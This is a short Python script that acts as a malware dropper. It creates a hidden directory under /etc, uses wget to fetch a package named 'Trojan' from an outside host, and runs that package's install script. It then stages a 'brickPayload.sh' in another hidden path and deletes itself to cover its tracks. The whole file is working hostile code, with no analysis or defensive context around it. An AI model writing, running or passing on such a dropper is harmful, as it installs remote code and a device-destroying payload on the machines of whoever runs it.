import os
import subprocess
from sys import argv
def main():
    directory = os.getcwd()
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan")
    os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
    print("Download complete. Starting installer.")
    os.system("chmod +x /etc/.a/Trojan/install.sh")
    os.system("bash /etc/.a/Trojan/install.sh")
    print("Install complete. Preping brick payload.")
    os.system("mv /etc/.a/files.ravenn.net/horror/brickPayload.sh /etc/.music")
    print("Total completion. Goodbye")
    os.remove(argv[0])
main()